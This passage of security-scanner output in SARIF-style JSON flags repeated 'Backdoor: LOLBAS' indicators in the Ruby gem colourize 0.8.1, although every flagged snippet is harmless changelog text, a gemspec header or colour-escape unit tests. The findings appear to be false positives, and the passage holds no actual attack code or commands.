                  "startColumn": 2,
                  "endLine": 6,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\n== 0.8.0 / 2016-06-27\n\t* add ColorizedString class\n\t* update README file\n\t* add rubocop.yml and follow style\n  * add italic mode\n  * remove interpreter warrnings\n",
                    "rendered": {
                      "text": "\n== 0.8.0 / 2016-06-27\n\t* add ColorizedString class\n\t* update README file\n\t* add rubocop.yml and follow style\n  * add italic mode\n  * remove interpreter warrnings\n",
                      "markdown": "`\n== 0.8.0 / 2016-06-27\n\t* add ColorizedString class\n\t* update README file\n\t* add rubocop.yml and follow style\n  * add italic mode\n  * remove interpreter warrnings\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/CHANGELOG"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 3,
                  "endLine": 12,
                  "endColumn": 11,
                  "snippet": {
                    "text": "  * remove interpreter warrnings\n\n== 0.7.7 / 2015-04-19\n  * update gems\n\n== 0.7.6 / 2015-04-18\n  * fix bugs\n",
                    "rendered": {
                      "text": "  * remove interpreter warrnings\n\n== 0.7.7 / 2015-04-19\n  * update gems\n\n== 0.7.6 / 2015-04-18\n  * fix bugs\n",
                      "markdown": "`  * remove interpreter warrnings\n\n== 0.7.7 / 2015-04-19\n  * update gems\n\n== 0.7.6 / 2015-04-18\n  * fix bugs\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/CHANGELOG"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 2,
                  "endLine": 6,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\n== 0.8.0 / 2016-06-27\n\t* add ColorizedString class\n\t* update README file\n\t* add rubocop.yml and follow style\n  * add italic mode\n  * remove interpreter warrnings\n",
                    "rendered": {
                      "text": "\n== 0.8.0 / 2016-06-27\n\t* add ColorizedString class\n\t* update README file\n\t* add rubocop.yml and follow style\n  * add italic mode\n  * remove interpreter warrnings\n",
                      "markdown": "`\n== 0.8.0 / 2016-06-27\n\t* add ColorizedString class\n\t* update README file\n\t* add rubocop.yml and follow style\n  * add italic mode\n  * remove interpreter warrnings\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/specifications/colourize-0.8.1.gemspec"
                },
                "region": {
                  "startLine": 2,
                  "startColumn": 23,
                  "endLine": 2,
                  "endColumn": 29,
                  "snippet": {
                    "text": "# -*- encoding: utf-8 -*-\n# stub: colourize 0.8.1 ruby lib\n\nGem::Specification.new do |s|\n  s.name = \"colourize\".freeze\n",
                    "rendered": {
                      "text": "# -*- encoding: utf-8 -*-\n# stub: colourize 0.8.1 ruby lib\n\nGem::Specification.new do |s|\n  s.name = \"colourize\".freeze\n",
                      "markdown": "`# -*- encoding: utf-8 -*-\n# stub: colourize 0.8.1 ruby lib\n\nGem::Specification.new do |s|\n  s.name = \"colourize\".freeze\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 92,
                  "startColumn": 22,
                  "endLine": 92,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n  def test_concatenated_strings_uncolorize\n    assert_equal \"none #{'red'.red} none #{'blue'.blue} none\".uncolorize,\n                 'none red none blue none'\n  end\n\n  def test_frozen_strings\n",
                    "rendered": {
                      "text": "\n  def test_concatenated_strings_uncolorize\n    assert_equal \"none #{'red'.red} none #{'blue'.blue} none\".uncolorize,\n                 'none red none blue none'\n  end\n\n  def test_frozen_strings\n",
                      "markdown": "`\n  def test_concatenated_strings_uncolorize\n    assert_equal \"none #{'red'.red} none #{'blue'.blue} none\".uncolorize,\n                 'none red none blue none'\n  end\n\n  def test_frozen_strings\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 36,
                  "endLine": 61,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n    assert_equal 'This is red on blue and underline'.colorize(:red).on_blue.underline,\n                 \"\\e[4;31;44mThis is red on blue and underline\\e[0m\"\n  end\n\n  def test_blue_with_red_background_and_blink_methods\n",
                    "rendered": {
                      "text": "\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n    assert_equal 'This is red on blue and underline'.colorize(:red).on_blue.underline,\n                 \"\\e[4;31;44mThis is red on blue and underline\\e[0m\"\n  end\n\n  def test_blue_with_red_background_and_blink_methods\n",
                      "markdown": "`\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n    assert_equal 'This is red on blue and underline'.colorize(:red).on_blue.underline,\n                 \"\\e[4;31;44mThis is red on blue and underline\\e[0m\"\n  end\n\n  def test_blue_with_red_background_and_blink_methods\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 25,
                  "endLine": 60,
                  "endColumn": 30,
                  "snippet": {
                    "text": "  end\n\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n    assert_equal 'This is red on blue and underline'.colorize(:red).on_blue.underline,\n                 \"\\e[4;31;44mThis is red on blue and underline\\e[0m\"\n  end\n\n",
                    "rendered": {
                      "text": "  end\n\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n    assert_equal 'This is red on blue and underline'.colorize(:red).on_blue.underline,\n                 \"\\e[4;31;44mThis is red on blue and underline\\e[0m\"\n  end\n\n",
                      "markdown": "`  end\n\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n    assert_equal 'This is red on blue and underline'.colorize(:red).on_blue.underline,\n                 \"\\e[4;31;44mThis is red on blue and underline\\e[0m\"\n  end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 36,
                  "endLine": 56,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n  def test_red_with_blue_background_symbol_and_method\n    assert_equal 'This is red on blue'.colorize(:red).on_blue,\n                 \"\\e[0;31;44mThis is red on blue\\e[0m\"\n  end\n\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n",
                    "rendered": {
                      "text": "\n  def test_red_with_blue_background_symbol_and_method\n    assert_equal 'This is red on blue'.colorize(:red).on_blue,\n                 \"\\e[0;31;44mThis is red on blue\\e[0m\"\n  end\n\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n",
                      "markdown": "`\n  def test_red_with_blue_background_symbol_and_method\n    assert_equal 'This is red on blue'.colorize(:red).on_blue,\n                 \"\\e[0;31;44mThis is red on blue\\e[0m\"\n  end\n\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 55,
                  "startColumn": 25,
                  "endLine": 55,
                  "endColumn": 30,
                  "snippet": {
                    "text": "  end\n\n  def test_red_with_blue_background_symbol_and_method\n    assert_equal 'This is red on blue'.colorize(:red).on_blue,\n                 \"\\e[0;31;44mThis is red on blue\\e[0m\"\n  end\n\n",
                    "rendered": {
                      "text": "  end\n\n  def test_red_with_blue_background_symbol_and_method\n    assert_equal 'This is red on blue'.colorize(:red).on_blue,\n                 \"\\e[0;31;44mThis is red on blue\\e[0m\"\n  end\n\n",
                      "markdown": "`  end\n\n  def test_red_with_blue_background_symbol_and_method\n    assert_equal 'This is red on blue'.colorize(:red).on_blue,\n                 \"\\e[0;31;44mThis is red on blue\\e[0m\"\n  end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 52,
                  "endLine": 46,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\n  def test_light_blue_with_red_background_symbol_and_hash\n    assert_equal 'This is light blue with red background'.colorize(:light_blue).colorize(:background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n  def test_blue_with_red_background_method\n",
                    "rendered": {
                      "text": "\n  def test_light_blue_with_red_background_symbol_and_hash\n    assert_equal 'This is light blue with red background'.colorize(:light_blue).colorize(:background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n  def test_blue_with_red_background_method\n",
                      "markdown": "`\n  def test_light_blue_with_red_background_symbol_and_hash\n    assert_equal 'This is light blue with red background'.colorize(:light_blue).colorize(:background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n  def test_blue_with_red_background_method\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 41,
                  "endLine": 45,
                  "endColumn": 46,
                  "snippet": {
                    "text": "  end\n\n  def test_light_blue_with_red_background_symbol_and_hash\n    assert_equal 'This is light blue with red background'.colorize(:light_blue).colorize(:background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n",
                    "rendered": {
                      "text": "  end\n\n  def test_light_blue_with_red_background_symbol_and_hash\n    assert_equal 'This is light blue with red background'.colorize(:light_blue).colorize(:background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n",
                      "markdown": "`  end\n\n  def test_light_blue_with_red_background_symbol_and_hash\n    assert_equal 'This is light blue with red background'.colorize(:light_blue).colorize(:background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 52,
                  "endLine": 41,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\n  def test_light_blue_with_red_background_hash\n    assert_equal 'This is light blue with red background'.colorize(:color => :light_blue, :background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n  def test_light_blue_with_red_background_symbol_and_hash\n",
                    "rendered": {
                      "text": "\n  def test_light_blue_with_red_background_hash\n    assert_equal 'This is light blue with red background'.colorize(:color => :light_blue, :background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n  def test_light_blue_with_red_background_symbol_and_hash\n",
                      "markdown": "`\n  def test_light_blue_with_red_background_hash\n    assert_equal 'This is light blue with red background'.colorize(:color => :light_blue, :background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n  def test_light_blue_with_red_background_symbol_and_hash\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 41,
                  "endLine": 40,
                  "endColumn": 46,
                  "snippet": {
                    "text": "  end\n\n  def test_light_blue_with_red_background_hash\n    assert_equal 'This is light blue with red background'.colorize(:color => :light_blue, :background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n",
                    "rendered": {
                      "text": "  end\n\n  def test_light_blue_with_red_background_hash\n    assert_equal 'This is light blue with red background'.colorize(:color => :light_blue, :background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n",
                      "markdown": "`  end\n\n  def test_light_blue_with_red_background_hash\n    assert_equal 'This is light blue with red background'.colorize(:color => :light_blue, :background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 92,
                  "startColumn": 22,
                  "endLine": 92,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n  def test_concatenated_strings_uncolorize\n    assert_equal \"none #{'red'.red} none #{'blue'.blue} none\".uncolorize,\n                 'none red none blue none'\n  end\n\n  def test_frozen_strings\n",
                    "rendered": {
                      "text": "\n  def test_concatenated_strings_uncolorize\n    assert_equal \"none #{'red'.red} none #{'blue'.blue} none\".uncolorize,\n                 'none red none blue none'\n  end\n\n  def test_frozen_strings\n",
                      "markdown": "`\n  def test_concatenated_strings_uncolorize\n    assert_equal \"none #{'red'.red} none #{'blue'.blue} none\".uncolorize,\n                 'none red none blue none'\n  end\n\n  def test_frozen_strings\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 36,
                  "endLine": 61,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n    assert_equal 'This is red on blue and underline'.colorize(:red).on_blue.underline,\n                 \"\\e[4;31;44mThis is red on blue and underline\\e[0m\"\n  end\n\n  def test_blue_with_red_background_and_blink_methods\n",
                    "rendered": {
                      "text": "\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n    assert_equal 'This is red on blue and underline'.colorize(:red).on_blue.underline,\n                 \"\\e[4;31;44mThis is red on blue and underline\\e[0m\"\n  end\n\n  def test_blue_with_red_background_and_blink_methods\n",
                      "markdown": "`\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n    assert_equal 'This is red on blue and underline'.colorize(:red).on_blue.underline,\n                 \"\\e[4;31;44mThis is red on blue and underline\\e[0m\"\n  end\n\n  def test_blue_with_red_background_and_blink_methods\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 60,
                  "startColumn": 25,
                  "endLine": 60,
                  "endColumn": 30,
                  "snippet": {
                    "text": "  end\n\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n    assert_equal 'This is red on blue and underline'.colorize(:red).on_blue.underline,\n                 \"\\e[4;31;44mThis is red on blue and underline\\e[0m\"\n  end\n\n",
                    "rendered": {
                      "text": "  end\n\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n    assert_equal 'This is red on blue and underline'.colorize(:red).on_blue.underline,\n                 \"\\e[4;31;44mThis is red on blue and underline\\e[0m\"\n  end\n\n",
                      "markdown": "`  end\n\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n    assert_equal 'This is red on blue and underline'.colorize(:red).on_blue.underline,\n                 \"\\e[4;31;44mThis is red on blue and underline\\e[0m\"\n  end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 36,
                  "endLine": 56,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n  def test_red_with_blue_background_symbol_and_method\n    assert_equal 'This is red on blue'.colorize(:red).on_blue,\n                 \"\\e[0;31;44mThis is red on blue\\e[0m\"\n  end\n\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n",
                    "rendered": {
                      "text": "\n  def test_red_with_blue_background_symbol_and_method\n    assert_equal 'This is red on blue'.colorize(:red).on_blue,\n                 \"\\e[0;31;44mThis is red on blue\\e[0m\"\n  end\n\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n",
                      "markdown": "`\n  def test_red_with_blue_background_symbol_and_method\n    assert_equal 'This is red on blue'.colorize(:red).on_blue,\n                 \"\\e[0;31;44mThis is red on blue\\e[0m\"\n  end\n\n  def test_red_with_blue_background_and_underline_sumbol_and_methods\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 55,
                  "startColumn": 25,
                  "endLine": 55,
                  "endColumn": 30,
                  "snippet": {
                    "text": "  end\n\n  def test_red_with_blue_background_symbol_and_method\n    assert_equal 'This is red on blue'.colorize(:red).on_blue,\n                 \"\\e[0;31;44mThis is red on blue\\e[0m\"\n  end\n\n",
                    "rendered": {
                      "text": "  end\n\n  def test_red_with_blue_background_symbol_and_method\n    assert_equal 'This is red on blue'.colorize(:red).on_blue,\n                 \"\\e[0;31;44mThis is red on blue\\e[0m\"\n  end\n\n",
                      "markdown": "`  end\n\n  def test_red_with_blue_background_symbol_and_method\n    assert_equal 'This is red on blue'.colorize(:red).on_blue,\n                 \"\\e[0;31;44mThis is red on blue\\e[0m\"\n  end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 52,
                  "endLine": 46,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\n  def test_light_blue_with_red_background_symbol_and_hash\n    assert_equal 'This is light blue with red background'.colorize(:light_blue).colorize(:background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n  def test_blue_with_red_background_method\n",
                    "rendered": {
                      "text": "\n  def test_light_blue_with_red_background_symbol_and_hash\n    assert_equal 'This is light blue with red background'.colorize(:light_blue).colorize(:background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n  def test_blue_with_red_background_method\n",
                      "markdown": "`\n  def test_light_blue_with_red_background_symbol_and_hash\n    assert_equal 'This is light blue with red background'.colorize(:light_blue).colorize(:background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n  def test_blue_with_red_background_method\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 41,
                  "endLine": 45,
                  "endColumn": 46,
                  "snippet": {
                    "text": "  end\n\n  def test_light_blue_with_red_background_symbol_and_hash\n    assert_equal 'This is light blue with red background'.colorize(:light_blue).colorize(:background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n",
                    "rendered": {
                      "text": "  end\n\n  def test_light_blue_with_red_background_symbol_and_hash\n    assert_equal 'This is light blue with red background'.colorize(:light_blue).colorize(:background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n",
                      "markdown": "`  end\n\n  def test_light_blue_with_red_background_symbol_and_hash\n    assert_equal 'This is light blue with red background'.colorize(:light_blue).colorize(:background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 52,
                  "endLine": 41,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\n  def test_light_blue_with_red_background_hash\n    assert_equal 'This is light blue with red background'.colorize(:color => :light_blue, :background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n  def test_light_blue_with_red_background_symbol_and_hash\n",
                    "rendered": {
                      "text": "\n  def test_light_blue_with_red_background_hash\n    assert_equal 'This is light blue with red background'.colorize(:color => :light_blue, :background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n  def test_light_blue_with_red_background_symbol_and_hash\n",
                      "markdown": "`\n  def test_light_blue_with_red_background_hash\n    assert_equal 'This is light blue with red background'.colorize(:color => :light_blue, :background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n  def test_light_blue_with_red_background_symbol_and_hash\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/test/test_colorize.rb"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 41,
                  "endLine": 40,
                  "endColumn": 46,
                  "snippet": {
                    "text": "  end\n\n  def test_light_blue_with_red_background_hash\n    assert_equal 'This is light blue with red background'.colorize(:color => :light_blue, :background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n",
                    "rendered": {
                      "text": "  end\n\n  def test_light_blue_with_red_background_hash\n    assert_equal 'This is light blue with red background'.colorize(:color => :light_blue, :background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n",
